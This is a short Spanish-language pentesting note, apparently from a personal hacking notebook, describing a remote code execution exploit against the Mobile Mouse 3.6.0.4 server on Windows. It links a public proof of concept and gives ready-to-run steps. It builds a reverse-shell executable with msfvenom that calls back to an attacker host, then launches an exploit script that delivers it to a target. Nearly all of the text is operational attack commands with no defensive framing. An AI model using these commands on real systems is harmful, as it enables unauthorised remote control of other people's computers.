# Mobile Mouse 

Tags: #MobileMouse #Windows 

Mobile Mouse es una aplicación que permite utilizar un teléfono móvil como ratón y teclado para controlar un ordenador de forma remota. Normalmente funciona mediante una aplicación cliente en el móvil y un programa servidor instalado en el PC.

NOTA:
	- Funciona mejor con Metasploit 

## Versión 3.6.0.4 - RCE
* [PoC - RCE](https://github.com/CSpanias/mobile-mouse-rce)
```bash
Paso 1:
# Crear el archivo shell.exe 
❯ msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=eth0 LPORT=443 -f exe > shell.exe


❯ python3 mobile-mouse-rce.py --target IP_Server --lhost IP_Kali --lport 443 --payload shell.exe

NOTA:
	- No tener nada ejecutando en el puerto 8080 para que funcione 
```